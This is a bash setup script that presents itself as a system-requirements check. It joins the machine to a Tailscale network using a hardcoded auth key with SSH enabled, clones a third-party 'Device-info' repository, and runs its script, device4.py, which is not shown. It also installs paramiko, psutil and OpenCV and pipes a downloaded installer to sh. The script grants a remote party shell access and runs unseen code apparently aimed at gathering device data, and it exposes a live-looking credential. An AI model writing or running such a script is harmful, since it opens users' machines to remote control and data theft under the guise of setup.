#!/bin/bash

# Function to check if a command exists
command_exists() {
    command -v "$1" &> /dev/null
}

echo "[*] Checking system requirements..."

# 1. Check if Python is installed
if ! command_exists python3; then
    echo "[*] Python not found. Installing Python..."
    sudo apt update
    sudo apt install -y python3 python3-pip
fi

# 2. Check if Tailscale is installed
if ! command_exists tailscale; then
    echo "[*] Tailscale not found. Installing Tailscale..."
    curl -fsSL https://tailscale.com/install.sh | sh
fi

# 3. Start Tailscale and log in using the provided Auth Key
echo "[*] Starting and logging into Tailscale using Auth Key..."
sudo tailscale up --authkey tskey-auth-kUU5ZKrmid11CNTRL-tsTWq7PrzaSiaA5peBcfaSE2pTgSamjZU --ssh

# 4. Check if Git is installed
if ! command_exists git; then
    echo "[*] Git not found. Installing Git..."
    sudo apt install -y git
fi

# 5. Clone the GitHub repository if it doesn't already exist
CLONE_DIR="Device-info"
if [ ! -d "$CLONE_DIR" ]; then
    echo "[*] Cloning the Device-info repository..."
    git clone https://github.com/uchihasosuke/Device-info.git "$CLONE_DIR"
fi

# 6. Change directory to the cloned repository
cd "$CLONE_DIR"

# 7. Install OpenCV and system dependencies using apt
echo "[*] Installing OpenCV and system dependencies..."
sudo apt install -y python3-opencv libgstreamer1.0-0 libgstreamer-plugins-base1.0-dev

# 8. Install required Python packages globally (no virtual environment)
echo "[*] Installing required Python packages globally (this may require --break-system-packages)..."
pip3 install paramiko psutil opencv-python-headless socket uuid datetime re getpass --break-system-packages

echo "[*] Python packages installed successfully."

# 9. Run the Python script
echo "[*] Running the device4.py script..."
python3 device4.py

# 10. Log out of Tailscale after successful completion
echo "[*] Logging out of Tailscale..."
sudo tailscale down

echo "[*] Tailscale session ended. Script completed successfully."